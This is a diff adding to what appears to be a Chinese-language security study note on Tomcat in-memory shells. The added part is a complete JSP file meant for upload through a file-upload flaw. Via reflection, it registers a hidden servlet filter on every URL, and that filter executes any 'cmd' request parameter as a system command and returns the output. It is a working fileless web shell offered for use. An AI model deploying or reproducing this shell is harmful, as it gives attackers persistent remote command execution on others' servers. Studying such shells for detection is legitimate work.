@@ -465,3 +465,102 @@ public class ServletFilterShell extends HttpServlet {
 ![](attachments/Pasted%20image%2020230313200620.png)
 
 如果是在上传文件中的利用，则上传jsp形式的文件
+
+```jap
+<%--  
+  Created by IntelliJ IDEA.  User: wum0nster  Date: 2023/3/13  Time: 20:07  To change this template use File | Settings | File Templates.--%>  
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
+<%@ page import="org.apache.catalina.Context" %>  
+<%@ page import="org.apache.catalina.core.ApplicationContext"%>  
+<%@ page import="org.apache.catalina.core.ApplicationFilterConfig"%>  
+<%@ page import="org.apache.catalina.core.StandardContext"%>  
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef"%>  
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap"%>  
+  
+  
+<%@ page import="javax.servlet.*"%>  
+<%@ page import="javax.servlet.annotation.WebServlet"%>  
+<%@ page import="javax.servlet.http.*"%>  
+  
+<%@ page import="java.io.IOException"%>  
+<%@ page import="java.io.InputStream"%>  
+<%@ page import="java.lang.reflect.Constructor"%>  
+<%@ page import="java.lang.reflect.Field"%>  
+<%@ page import="java.util.Map"%>  
+<%@ page import="java.util.Scanner"%>  
+  
+  
+  
+<%  
+    Field Configs;  
+    Map filterConfigs;  
+    //获取上下文  
+    ServletContext servletContext = request.getSession().getServletContext();  
+    //反射获取standard context  
+    Field appctx = servletContext.getClass().getDeclaredField("context");  
+    appctx.setAccessible(true);  
+    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
+  
+    Field stdctx = applicationContext.getClass().getDeclaredField("context");  
+    stdctx.setAccessible(true);  
+    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
+    //设置恶意的filter类  
+    String Filtername = "Filter_Shell";  
+    Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
+    Configs.setAccessible(true);  
+    filterConfigs = (Map) Configs.get(standardContext);  
+  
+    if (filterConfigs.get(Filtername) == null) {  
+        Filter filter = new Filter() {  
+            @Override  
+            public void init(FilterConfig filterConfig) throws ServletException{  
+  
+            }            @Override  
+            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
+            HttpServletRequest req = (HttpServletRequest) servletRequest;  
+            if (req.getParameter("cmd") != null){  
+                System.out.println("do some bad bad");  
+  
+                InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
+  
+                Scanner s = new Scanner(in).useDelimiter("\\A");  
+                String output = s.hasNext() ? s.next() : "";  
+                servletResponse.getWriter().write(output);  
+                return; }  
+            filterChain.doFilter(servletRequest,servletResponse);  
+            }  
+            @Override  
+            public void destroy() {  
+  
+            }        };  
+    //通过反射获取filterdef  
+    FilterDef filterDef = new FilterDef();  
+    filterDef.setFilter(filter);  
+    filterDef.setFilterName(Filtername);  
+    filterDef.setFilterClass(filter.getClass().getName());  
+    standardContext.addFilterDef(filterDef);  
+    //反射获取filtermap  
+        FilterMap filterMap = new FilterMap();  
+        filterMap.addURLPattern("/*");  
+        filterMap.setFilterName(Filtername);  
+        filterMap.setDispatcher(DispatcherType.REQUEST.name());  
+        standardContext.addFilterMapBefore(filterMap);  
+     //反射拿  
+        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);  
+        constructor.setAccessible(true);  
+        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);  
+        filterConfigs.put(Filtername, filterConfig);  
+        out.print("success");  
+  
+    }  
+  
+%>  
+<html>  
+<head>  
+    <title>filter</title>  
+</head>  
+<body>  
+Hello Filter  
+</body>  
+</html>
+```
